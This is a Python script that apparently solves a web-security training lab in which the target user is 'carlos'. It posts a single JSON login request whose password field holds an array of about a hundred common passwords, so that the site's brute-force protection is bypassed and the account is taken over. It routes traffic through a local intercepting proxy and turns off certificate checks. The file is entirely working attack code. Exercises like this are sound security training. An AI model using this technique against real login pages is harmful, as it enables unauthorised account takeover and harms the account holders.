import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FAIL = -1

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'}

def access_carlos_account(url, session):
    login_url = url + "/login"
    payload = {
        "username": "carlos",
        "password": ["123456","password",
        "12345678","qwerty","123456789",
        "12345","1234","111111",
        "1234567","dragon","123123",
        "baseball","abc123","football",
        "monkey","letmein","shadow",
        "master","666666","qwertyuiop",
        "123321","mustang","1234567890",
        "michael","654321","superman",
        "1qaz2wsx","7777777","121212",
        "000000","qazwsx","123qwe",
        "killer","trustno1","jordan",
        "jennifer","zxcvbnm","asdfgh",
        "hunter","buster","soccer",
        "harley","batman","andrew",
        "tigger","sunshine","iloveyou",
        "2000","charlie","robert",
        "thomas","hockey","ranger",
        "daniel","starwars","klaster",
        "112233","george","computer",
        "michelle","jessica","pepper",
        "1111","zxcvbn","555555",
        "11111111","131313","freedom",
        "777777","pass","maggie",
        "159753","aaaaaa","ginger",
        "princess","joshua","cheese",
        "amanda","summer","love",
        "ashley","nicole","chelsea",
        "biteme","matthew","access",
        "yankees","987654321",
        "dallas","austin","thunder",
        "taylor","matrix","mobilemail",
        "mom","monitor","monitoring",
        "montana","moon","moscow"]}
    headers = {"Content-Type": "application/json"}
    response = session.post(
        login_url,
        json=payload,
        headers=headers,
        verify=False,
        proxies=proxies)
    return "Log out" in response.text

if __name__ == "__main__":
    try:
        url = sys.argv[1]
        session = requests.Session()
        print("[+] Accessing Carlos's account...")
        if not access_carlos_account(url, session):
            print("[-] Carlos's account access failed.")
            sys.exit(FAIL)
        print("[+] Carlos's account access was successful.")
    except IndexError:
        print("[+] Usage: %s <url>" % sys.argv[0])
        print("[+] Example: %s www.example.com" % sys.argv[0])
        sys.exit(FAIL)
    except Exception as exception:
        print("An exception occured %s" % exception)
        print("[-] The authentication attack was not successful.")
        sys.exit(FAIL)    